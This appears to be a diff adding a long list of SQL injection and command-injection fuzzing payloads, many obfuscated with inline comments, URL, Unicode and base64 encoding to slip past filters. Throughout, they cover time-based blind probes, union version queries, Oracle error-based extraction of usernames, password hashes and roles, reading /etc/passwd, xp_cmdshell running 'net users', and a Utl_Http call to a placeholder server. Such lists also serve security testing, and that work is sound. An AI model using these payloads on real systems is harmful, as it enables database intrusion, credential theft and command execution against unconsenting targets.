+' and 1=utl_inaddr.get_host_address((select distinct(USERNAME) from (select distinct(USERNAME), ROWNUM as limit from SYS.ALL_USERS) where limit=5)) and 'i'='i
+select--%0Acurrent_setting('log_connections');
+1||Utl_Http.request('http://<yourservername>') from dual-- and '0having'='0having'
+9999'||(select%23uSOxrBIXv%0A%23AyQNZbgZo%0A99999999%23ngNItJEDoBuQ%0Afrom%23cxenBinEx%0A%23YuGCpCAXMSdf%0Apg_sleep(15))||'9999
+or ''qwer''=''qwer''
+"%23MMVqYM%0Aand%23LfZEoGKKkD%0A0=benchmark(3000000,MD5(1))%20--
+%27%2B%69%66%28%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%2D%2D
+' union (select null, null, (select @@version)) --
+(select--DZZOnUqJJr%0Acount(*)--FCovemzOAj%0Afrom--efGjsOLXS%0Asysibm.systables--EftpXezQuw%0Aas--mlDPjUoz%0At1,sysibm.systables--iQSqUW%0Aas--rtzFIgXUydRi%0At2,sysibm.systables--wnAznLr%0Aas--OVkcolFj%0At3)--uQmJago%0Aas--AuUlErpXKZkL%0Atest
+'%09AND%091=utl_inaddr.get_host_address((SELECT%0BDISTINCT(column_name)%0AFROM%0C(SELECT%0CDISTINCT(column_name),%09ROWNUM%0DAS%0ALIMIT%0DFROM%0Dall_tab_columns)%0CWHERE%0BLIMIT=4))%0AAND%0B'i'='i
+';%23pBphvYEwJr%0Aexecute%23natqBakH%0Aimmediate%23gBcelUk%0A'sel'%23YQCEHGuIjBL%0A||%23DAYTnTGOlS%0A'ect%23oOzJSLYX%0Aus'%23gamGUA%0A||%23IzrQSsOKTlDx%0A'er'
+seLeCT vERsIoN();
+"+iF(benchmark(3000000,MD5(1)),NulL,NulL),NulL,NulL,NulL)%20%23
+'%09;%09drop%09table%0Ctemp%09--
+select--oLberAvNr%0Aversionnumber,--TqDaKZ%0Aversion_timestamp--FpWQSqbm%0Afrom--CAmffUAVXkW%0Asysibm.sysversions;
+))) and 0=benchmark(3000000,MD5(1))%20--
+%22%29%29%29%29%20%61%6E%64%20%30%3D%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%20%2D%2D
+'+or+2+between+2+and+5
+%u007C%u0020%u0069%u0064
+ping%23GAvIzWsT%0A-n%23oLXbGfrN%0A30
+or--dgkoeb%0Aa=a
+JykpKSB3YWl0Zm9yIGRlbGF5ICcwOjA6MjAnIC0t
+%u0022%u0029%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u0029%u0020%u0077%u0061%u0069%u0074%u0066%u006F%u0072%u0020%u0064%u0065%u006C%u0061%u0079%u0020%u0027%u0030%u003A%u0030%u003A%u0032%u0030%u0027%u0020%u002F%u002A
+%'%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%)%20%w%a%i%t%f%o%r%20%d%e%l%a%y%20%'%0%:%0%:%2%0%'%20%/%*
+)/**/waitfor/**/delay/**/'0:0:20'/**//*
+PRINT%0D@@variable
+%C0%AA%C0%ABif%C0%AAbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%C0%AENULL%C0%AENULL%C0%AB%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AB%20%C0%AF%C0%AF
+%bf%27 AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6))--
+select%23%0A*%23%0Afrom%23%0Asyscat.tabauth;
+' /*!30670AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i*/
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--%00
+1' and non_existant_table = '1%00
+'+AND+1=utl_inaddr.get_host_address((SELECT+DISTINCT(table_name)+FROM+(SELECT+DISTINCT(table_name),+ROWNUM+AS+LIMIT+FROM+sys.all_tables)+WHERE+LIMIT=8))+AND+'i'='i
+y /*!00000' or 3=3 */--
+%' %u%n%i%o%n %(%s%e%l%e%c%t %N%U%L%L%, %N%U%L%L%, %N%U%L%L%, %N%U%L%L%,  %(%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%)%) %-%-
+%bf%27; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >
+' or 1 --'%00
+%2527%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2530%253A%2532%2530%2527%2520%252F%252A
+%257C%2520%2570%2569%256E%2567%2520%252D%2569%2520%2533%2530%2520%2531%2532%2537%252E%2530%252E%2530%252E%2531%2520%257C
+DELeTE
+,@variable and '0having'='0having'
+' o/**/r 'whatever' i/**/n ('whatever')
+%39%39%39%39%22%7C%7C%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%20%66%72%6F%6D%20%64%6F%6D%61%69%6E%2E%64%6F%6D%61%69%6E%73%20%61%73%20%74%31%2C%64%6F%6D%61%69%6E%2E%63%6F%6C%75%6D%6E%73%20%61%73%20%74%32%2C%64%6F%6D%61%69%6E%2E%74%61%62%6C%65%73%20%61%73%20%74%33%29%7C%7C%22%39%39%39%39
+'--qTHymhgLD%0AAND--NaMNpo%0A1=utl_inaddr.get_host_address((SELECT--lsOMlMdhoN%0ADISTINCT(column_name)--hQjjok%0AFROM--AJseZDDj%0A(SELECT--GFPHweYVrB%0ADISTINCT(column_name),--EWLfmuK%0AROWNUM--GmdsbT%0AAS--kkkgyMHF%0ALIMIT--DDYFsnkesXUA%0AFROM--jajXQMaua%0Aall_tab_columns)--TvmOBn%0AWHERE--RwaQCdDSJkh%0ALIMIT=8))--NHZEhDfyvB%0AAND--tVojymcT%0A'i'='i
+')%0Bor%0A1=1%0Aor%0C('1'='1
+" /*!00000or benchmark(10000000,MD5(1))*/#
+999999)) or 1=1 or ((1=1%00
+%0a+dir+c:\-- sp_password
+%C0%AF%C0%ABif%C0%AAbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%C0%AENULL%C0%AENULL%C0%AB%C0%AENULL%C0%AB%20%C0%AF%C0%AF
+JyAoc2VsZWN0IHRvcCAx
++if(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/)%20--
+1))%0Aor%0Epg_sleep(__TIME__)--
+))) /*!00000and 0=benchmark(3000000,MD5(1))%20*//*
+a%00%27
+' A/**/ND 1=utl_inaddr.get_host_address((S/**/EL/**/E/**/CT DI/**/S/**/T/**/I/**/NCT(granted_role) FR/**/OM (S/**/EL/**/E/**/CT DI/**/S/**/T/**/I/**/NCT(granted_role), ROWNUM A/**/S L/**/IM/**/IT FR/**/OM dba_role_privs WHER/**/E GRANTEE=SYS.LOGINUSER) WHER/**/E L/**/IM/**/IT=1)) A/**/ND 'i'='i
+eCcgQU5EIHVzZXJpZCBJUyBOVUxMOyAtLQ==
+%C0%AF%C0%AAor%C0%AAusername%C0%AAlike%C0%AAchar%C0%AA37%C0%AB%C0%BB
+;echo%23%0A111111
+"))))--XDqMRwF%0Aand--LGrJTkORtSeD%0A0=benchmark(3000000,MD5(1))%20/*
+"+if(benchmark(3000000,MD5(1)),NULL%09,NULL%09),NULL%09)%20/*
+' union select 1,2,3,x,x,x,x,@@version,x每%00
+'%09union%09(select%0A@@version)%0A--
+(s/**/ubst/**/ri/**/ng(ve/**/r/**/si/**/on(),1,1)=5)
+'))) or 1=1 or ((('1'='1
+y+' or 2 > 1
+or 0=0 #sp_password
+%u0061%u006E%u0064%u0020%u0030%u003D%u0062%u0065%u006E%u0063%u0068%u006D%u0061%u0072%u006B%u0028%u0033%u0030%u0030%u0030%u0030%u0030%u0030%u002C%u004D%u0044%u0035%u0028%u0031%u0029%u0029%u0020%u002F%u002A
++if%23VLUhYpIyyA%0A(benchmark(3000000,MD5(1)),NULL%23xNBueY%0A,NULL%23EQKLptBP%0A),NULL%23MOrOpwZ%0A,NULL%23FlIOACdDpuJF%0A)%20--
+' /*!30811or a=a*/--
+9999'/**/or/**/benchmark(15000000,md5(0x4e446b6e))/**/or/**/'0'='9999
+' /*!00000waitfor delay '0:0:20' */--
+%EF%BC%87%20or%20%EF%BC%87%EF%BC%87=%EF%BC%87
+%EF%BC%87,NULL,NULL,NULL)%20waitfor%20delay%20%EF%BC%870:0:20%EF%BC%87%20--
+%C0%BBid%C0%BB
+%)%)%)%)%)%)%)%)%)%)
+1'or%23mEKUeSlTl%0A'1
+",/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20waitfor%20delay%20'0:0:20'%20--
+s/**/e/**/lect current_setting('port');
++if(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20/*
+';/*!exec*/master..xp_cmdshell 'ping 172.10.1.255'--
+I/**/F(SUBSTR(@@ver/**/s/**/i/**/on,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3))/*’XO/**/R(I/**/F(SUBSTR(@@ver/**/s/**/i/**/on,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))O/**/R’|”XO/**/R(I/**/F(SUBSTR(@@ver/**/s/**/i/**/on,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))O/**/R”*/
+'%0Dunion%0Bselect%0Dall%091,2,x,x,x,x%0B〞
+%u0027%u0020%u006F%u0072%u0020%u0032%u0020%u003E%u0020%u0031
+%u0068%u0069%u0020%u006F%u0072%u0020%u0061%u003D%u0061
+1;SELECT%09%20*
+)))) and 0 LIKE benchmark(3000000,MD5(1))%20%23
+'/*!0or 'something' = '/*!0some'+'thing'
+declare%23zNbskgklA%0A@q%23pMGKHFMgqk%0Anvarchar%23gyljoGME%0A(200)%23nxKIyuVpn%0Aselect%23LPVLQy%0A%23aKRIoXYuwo%0A@q%23NNHUuNn%0A=%23lOOldEBkk%0A0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000%23deyOSxM%0Aexec%23wBkhgwelbjEO%0A(@q)
+create table myfile (line varchar(8000))" bulk insert foo from %bf%27c:\inetpub\wwwroot\auth.asp?" select * from myfile"--
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'--%0AAND--%0A1=utl_inaddr.get_host_address((SELECT--%0ACOUNT(DISTINCT(USERNAME))--%0AFROM--%0ASYS.ALL_USERS))--%0AAND--%0A'i'='i
+') and 0=benchmark(3000000,MD5(1))%20%23%00
+create    table   myfile (   input  TEXT); load data  infile  '<filepath>'  into     table   myfile;    select    *  from   myfile;
+')--EedDxHQHrNe%0Aor--GQDZnx%0A('a'='a
+%)%)%)%) %w%a%i%t%f%o%r %d%e%l%a%y %'%0%:%0%:%2%0%' %/%*
+%bf%27 or pg_sleep(__TIME__)--
+" waitfor delay '0:0:20' /*
+")%23%0Aand%23%0A0=benchmark(3000000,MD5(1))%20%23
+%bf%27)))) waitfor delay '0:0:20' --
+a|/usr/bin/id%00
+" /*!30865waitfor delay '0:0:20' */--
+KHNlbGVjdCBjb3VudCgqKSBmcm9tIGFsbF91c2VycyB0MSxhbGxfdXNlcnMgdDIsYWxsX3VzZXJzIHQzLGFsbF91c2VycyB0NCxhbGxfdXNlcnMgdDUpIGFzIHRlc3Q=
+",nulL,nulL,nulL,nulL,nulL,nulL,nulL,nulL)%20waitfor%20delay%20'0:0:20'%20/*
+)) an/**/d 0=benchmark(3000000,MD5(1))%20/*
+')))%23%0Awaitfor%23%0Adelay%23%0A'0:0:20'%23%0A/*
+'%0Bor%0C''qwer''%0B--'
+%2522%2529%2529%2529%2529%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2530%253A%2532%2530%2527%2520%252D%252D
+'    or  ''qwer''=''qwer''--
+%2522%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2530%253A%2532%2530%2527%2520%252D%252D
+or 0=0 #"sp_password
+" or 1 LIKE 1 or "1" LIKE "1
+%2522%252B%2569%2566%2528%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%2520%252D%252D
+'%23LBVnGFp%0Aor%23fRYmAiO%0A'4479'='4479'--
+'%07or%0D'text'%04>%01't'
+'))%0Fwaitfor%03delay%05'0:0:20'%0F/*
+%EF%BC%87 or %EF%BC%87something%EF%BC%87 = %EF%BC%87some%EF%BC%87+%EF%BC%87thing%EF%BC%87
+'))%23jouNrPAbrK%0Aor%23YbGZTlCCLv%0Asleep(__TIME__)='
+%2527%2520%256F%2572%2520%2527%2557%2527%253D%2527%2557%2527%2520%2523
+declare%23%0A@s%23%0Avarchar%23%0A(8000)%23%0Aselect%23%0A@s%23%0A=%23%0A0x73656c65637420404076657273696f6e
+%u0027%u0020%u006F%u0072%u0020%u0031%u0020%u0069%u006E%u0020%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u002D%u002D
+%u0027%u003B%u0020%u0069%u0066%u0020%u006E%u006F%u0074%u0028%u0073%u0075%u0062%u0073%u0074%u0072%u0069%u006E%u0067%u0028%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u002C%u0032%u0035%u002C%u0031%u0029%u0020%u003C%u003E%u0020%u0030%u0029%u0020%u0077%u0061%u0069%u0074%u0066%u006F%u0072%u0020%u0064%u0065%u006C%u0061%u0079%u0020%u0027%u0030%u003A%u0030%u003A%u0032%u0027%u0020%u002D%u002D
+") oR 1=1 oR ("1"="1
+9999'||(select%23SMmtYMTvoz%0Acount(*)%23kcmsQlHvOY%0Afrom%23HtewSin%0AINFORMATION_SCHEMA.tables%23prLNEa%0Aas%23SYTPDouUJQkF%0Asys1,INFORMATION_SCHEMA.tables%23DtMkRDvqooFf%0Aas%23ERQWacbmbbuG%0Asys2,INFORMATION_SCHEMA.tables%23IkbtyIR%0Aas%23ZUgDTam%0Asys3,INFORMATION_SCHEMA.tables%23tbTDQmfeg%0Aas%23mbIbPwiHef%0Asys4,INFORMATION_SCHEMA.tables%23ZYQfDTiQpHc%0Aas%23vFiWVZZnAJTN%0Asys5,INFORMATION_SCHEMA.tables%23ugvPIZtUV%0Aas%23YmzVoNjtFAR%0Asys6)||'9999
+%' %A%N%D %1%=%u%t%l%_%i%n%a%d%d%r%.%g%e%t%_%h%o%s%t%_%a%d%d%r%e%s%s%(%(%S%E%L%E%C%T %g%l%o%b%a%l%_%n%a%m%e %F%R%O%M %g%l%o%b%a%l%_%n%a%m%e%)%) %A%N%D %'%i%'%=%'%i
+select--%0A*--%0Afrom--%0Asyscat.dbauth--%0Awhere--%0Agrantee--%0A=--%0Acurrent--%0Auser;
+')   or   ('a'='a
+9999"||(select%23wTASzDNeSEex%0A99999999%23IPErJtAHdYM%0Afrom%23NiUQviyt%0Apg_sleep(15))||"9999
+'1'Or'1∩
+' oR 'SOmEthing' = 'SOmE'+'thing'
+%C0%DEnid%C0%DEn
+echo%C0%AA111111
+,null,null,null)%20waitfor%20delay%20'0:0:20'%20/*
+'  or  '4479'='4479'--
+' o/**/r '4479'='4479'--
+' o/**/r 4479=4479 #
+%27%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D
+%;%/%u%s%r%/%b%i%n%/%i%d%\%n
+or-- sp_password
+23+OR+1=1
+y'%0CAND%0Amembers.email%0CIS%0DNULL;%0A--
+0%00
+' Or 2 > 1
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*%00
+")%23%0Aor%23%0Apg_sleep(__TIME__)--
+\n/bin/ls%0D-al\n
+);waitfor%23glQxXstauviX%0Adelay%23LuuNsBuax%0A'0:0:__TIME__'--
+%27union+select%23pHDfnlszH%0A+UTL_INADDR.get_host_name('INTERNALs-IP'),null%23Bnrqkj%0A,null%23owIqyv%0A,null%23YryIPxfeK%0A,null%23QjdHIKeSXp%0A+from%23OgqYGNx%0A+dual%23ZGgrVTHe%0A每
+")))--sfkZOXONo%0Aand--mYESeeElD%0A0=benchmark(3000000,MD5(1))%20/*
+")))/**/and/**/0=benchmark(3000000,MD5(1))%20/*
+' /*!30958or 4479=4479 */--
+%u0072%u0065%u0073%u0070%u006F%u006E%u0073%u0065%u002E%u0077%u0072%u0069%u0074%u0065%u0020%u0031%u0031%u0031%u0031%u0031%u0031
+i/**/n/**/s/**/e/**/rt
+'%03union%0A(select%06NULL,%09NULL,%0F(select%01@@version))%03--
+ZGVzYw==
+\';/**/desc/**/users;/**/--
+1%0Eor%091=1
+'));waitfor%0Bdelay%0A'0:0:__TIME__'--
+'  AND    1=utl_inaddr.get_host_address((  SELECT      DISTINCT(PASSWORD)  FROM   (  SELECT      DISTINCT(PASSWORD), ROWNUM  AS      LIMIT    FROM   SYS.   USER $)  WHERE      LIMIT  =5))  AND    'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i%00
+(select /*!00000count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)*/
+%'%)%,%N%U%L%L%,%N%U%L%L%)%20%w%a%i%t%f%o%r%20%d%e%l%a%y%20%'%0%:%0%:%2%0%'%20%/%*
+'%09union+select+banner,null,null,null,null+from+v$version每
+'    or    4479=4479 /*
+'  or   1=1  or   ''='
+updatE
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--%00
+%0a--FQrSgIGNTBh%0Aid--XtPfjZFPYe%0A%0a
+' AND 1 LIKE utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE LIKE SYS.LOGINUSER) WHERE LIMIT LIKE 3)) AND 'i' LIKE 'i
+' /*!30863or 'text' = n'text'*/
+,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20waitfor%20delay%20'0:0:20'%20--
+1--EKJmPLgW%0Aor--qWeNNRrQ%0A1=1
+or 1=1 and '0having'='0having'
+select%23zpSIfgRK%0A*%23mfaUIMuW%0Afrom%23rgaZUrkvQIBj%0Asysusers
+%EF%BC%87 AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND %EF%BC%87i%EF%BC%87=%EF%BC%87i
+%79%6F%72%20%27%61%27%3D%27%61%27%20%2D%2D
+%00%27)))) waitfor delay %00%270:0:20%00%27 /*
+9999"||( select      count(*)   from    rdb$fields   as  t1,rdb$types   as  t2,rdb$collations   as  t3)||"9999
+'),   NULL   ,   NULL   ,   NULL   )%20waitfor%20delay%20'0:0:20'%20--
+%2522%2529%252C%2528%2573%2565%256C%2565%2563%2574%2520%2569%2566%2528%2563%256F%2575%256E%2574%2528%252A%2529%2521%253D%252D%2531%252C%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%252C%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%2529%2529%2523
++/*!0if(benchmark(3000000,MD5(1)),/*!0NULL,/*!0NULL),/*!0NULL,/*!0NULL,/*!0NULL)%20/*
+%26%26+|+dir%04c:%255c
+%28%00
+, NULL   , NULL   )%20waitfor%20delay%20'0:0:20'%20/*
+) waitfor delay '0:0:20' ---- sp_password
+%22%29%2C%28%73%65%6C%65%63%74%20%69%66%28%63%6F%75%6E%74%28%2A%29%21%3D%2D%31%2C%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%2C%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%29%29%2F%2A
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+%C0%AA%C0%ABif%C0%AAbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%C0%AENULL%C0%AENULL%C0%AB%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AB%20%C0%AF%C0%AF
+or /*!306764479=4479*/
+%u0027%u0020%u006F%u0072%u0020%u0070%u0067%u005F%u0073%u006C%u0065%u0065%u0070%u0028%u005F%u005F%u0054%u0049%u004D%u0045%u005F%u005F%u0029%u002D%u002D
+%2578%2579%257A%2527%2520%254F%2552%2520%2531%253D%2531%252B%252D%252D
+'%23%0AAND%23%0A1=utl_inaddr.get_host_address((SELECT%23%0ADISTINCT(column_name)%23%0AFROM%23%0A(SELECT%23%0ADISTINCT(column_name),%23%0AROWNUM%23%0AAS%23%0ALIMIT%23%0AFROM%23%0Aall_tab_columns)%23%0AWHERE%23%0ALIMIT=2))%23%0AAND%23%0A'i'='i
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))-- and '0having'='0having'
+order /*!00000by*/
++if%23RqRFKOatVy%0A(benchmark(3000000,MD5(1)),NULL%23HMbcaM%0A,NULL%23tGRaikRSOHf%0A),NULL%23nDXMFpDK%0A,NULL%23lEeaxjWuCD%0A,NULL%23HejkRk%0A,NULL%23OJSLvOKifZM%0A,NULL%23BXoVjlrCmI%0A,NULL%23yvjXZge%0A,NULL%23JCSvIixSVMQE%0A)%20/*
+LS1zcF9wYXNzd29yZA==
+"--JwzAvNRrKRMi%0Aor--XSNRnul%0A0=0--qTYqSjjcpX%0A--
+" /*!00000waitfor delay '0:0:20' */--
+%29-- sp_password
+')))%01waitfor%0Cdelay%0A'0:0:20'%04--
+' /*!00000or uname like '%*/
+select current_setting(%00%27virtual_host%00%27);
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+'; /*!30762exec xp_regread*/
+9999'||(select%23tFmjDVK%0Acount(*)%23YYtFoYtwRvOI%0Afrom%23nyBYcLw%0Adomain.domains%23UbiFnOsCr%0Aas%23XrsKOG%0At1,domain.columns%23XmVRBXV%0Aas%23XIUIORvCuTww%0At2,domain.tables%23lGOHKKJUgrt%0Aas%23lENFzRrFISWt%0At3)||'9999
+,NULL)%20waitfor%20delay%20%bf%270:0:20'%20/*
+' or 2 between 1 and 5 and '0having'='0having'
+'--%0Aor--%0A3=3
+y' A/**/ND 1=(SELE/**/CT COU/**/NT(*) FR/**/OM tabname); --
+' AND 1=utl_inaddr.get_host_address((SESELECTLECT DISTINCT(granted_role) FRFROMOM (SESELECTLECT DISTINCT(granted_role), ROWNUM AS LIMIT FRFROMOM dba_role_privs WHERWHEREE GRANTEE=SYS.LOGINUSER) WHERWHEREE LIMIT=2)) AND 'i'='i
+'%23vJzswgY%0Aunion%23rkGXTaHxakP%0A%23lTlxqowJxCb%0Aselect%23WXLxoyGuUC%0A%23lxrQgHKQFE%0A1,load_file('/etc/passwd'),1,1,1;
+'/*!0or 3=3
+'/*!AND*/1=utl_inaddr.get_host_address((/*!SELECT*/DISTINCT(USERNAME)/*!FROM*/(/*!SELECT*/DISTINCT(USERNAME), ROWNUM/*!AS*//*!LIMIT*//*!FROM*/SYS.ALL_USERS)/*!WHERE*//*!LIMIT*/=1))/*!AND*/'i'='i
+9999'||(select /*!30165like('abcdefg',upper(hex(randomblob(150000000)))))||'9999*/
+<username>' OR 1=1--
+23 OR 1=1-- sp_password
+(SelECt COUnT(*) FroM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+')))))) waitfor delay '0:0:20' --
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i-- sp_password
+";waitfor%23%0Adelay%23%0A'0:0:__TIME__'--
+",NULL%09,NULL%09,NULL%09,NULL%09,NULL%09)%20waitfor%20delay%20'0:0:20'%20--
+%EF%BC%87) or sleep(__TIME__)=%EF%BC%87
+MSBhbmQgYXNjaWkobG93ZXIoc3Vic3RyaW5nKChzZWxlY3QgdG9wIDEgbmFtZSBmcm9tIHN5c29iamVjdHMgd2hlcmUgeHR5cGU9J3UnKSwgMSwgMSkpKSA+IDExNg==
+'%0Bunion%0B(select%0D@@version)%09--
+to_timestamp_tz
+')))/*!0and 0=benchmark(3000000,MD5(1))%20/*
+)))))--%0Awaitfor--%0Adelay--%0A'0:0:20'--%0A--
+'    or   uname  like    '%
+'/**/or/**/4479/**/in/**/(select/**/@@version)--
+declare%0D@s%02varchar%05(200)%0Aselect%0E@s%01=%060x73656c65637420404076657273696f6e%0Bexec(@s)
+%C0%AF%C0%AA%C0%AF%C0%AF
+'+AND+1=utl_inaddr.get_host_address((SELECT+DISTINCT(PASSWORD)+FROM+(SELECT+DISTINCT(PASSWORD),+ROWNUM+AS+LIMIT+FROM+SYS.USER$)+WHERE+LIMIT=2))+AND+'i'='i
+);waitfor%23AXPeTnvYqs%0Adelay%23tWahiFmN%0A'0:0:__TIME__'--
+xyz' OR 1%3D1+-- and '0having'='0having'
+%\%n%/%b%i%n%/%l%s %-%a%l%\%n
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20-- and '0having'='0having'
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20%00%270:0:20%00%27%20--
+%'%+%i%f%(%b%e%n%c%h%m%a%r%k%(%3%0%0%0%0%0%0%,%M%D%5%(%1%)%)%,%N%U%L%L%,%N%U%L%L%)%,%N%U%L%L%,%N%U%L%L%)%20%23
+9999"||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||"9999 and '0having'='0having'
+1%23%0Aand%23%0Aascii(lower(substring((select%23%0Atop%23%0A1%23%0Aname%23%0Afrom%23%0Asysobjects%23%0Awhere%23%0Axtype='u'),%23%0A1,%23%0A1)))%23%0A>%23%0A116
+'%03or%081=1--
+exec%23fBKGVV%0Amaster..xp_cmdshell%23RLxCuFtG%0A'net+users'
+"%0Cor%0Asleep(__TIME__)="
+"))))%0Aand%0C0=benchmark(3000000,MD5(1))%20--
+JyBBTkQgMT11dGxfaW5hZGRyLmdldF9ob3N0X2FkZHJlc3MoKFNFTEVDVCBESVNUSU5DVChjb2x1bW5fbmFtZSkgRlJPTSAoU0VMRUNUIERJU1RJTkNUKGNvbHVtbl9uYW1lKSwgUk9XTlVNIEFTIExJTUlUIEZST00gYWxsX3RhYl9jb2x1bW5zKSBXSEVSRSBMSU1JVD00KSkgQU5EICdpJz0naQ==
+9999'||(select--%0Alike('abcdefg',upper(hex(randomblob(150000000)))))||'9999
+JyBvciAndW51c3VhbCcgPSAndW51c3VhbCc=
+%C0%AF%C0%AAAND%C0%AA1%C0%BFutl%C0%DFinaddr%C0%AEget%C0%DFhost%C0%DFaddress%C0%AA%C0%AASELECT%C0%AADISTINCT%C0%AAgranted%C0%DFrole%C0%AB%C0%AAFROM%C0%AA%C0%AASELECT%C0%AADISTINCT%C0%AAgranted%C0%DFrole%C0%AB%C0%AE%C0%AAROWNUM%C0%AAAS%C0%AALIMIT%C0%AAFROM%C0%AAdba%C0%DFrole%C0%DFprivs%C0%AAWHERE%C0%AAGRANTEE%C0%BFSYS%C0%AELOGINUSER%C0%AB%C0%AAWHERE%C0%AALIMIT%C0%BF4%C0%AB%C0%AB%C0%AAAND%C0%AA%C0%AFi%C0%AF%C0%BF%C0%AFi
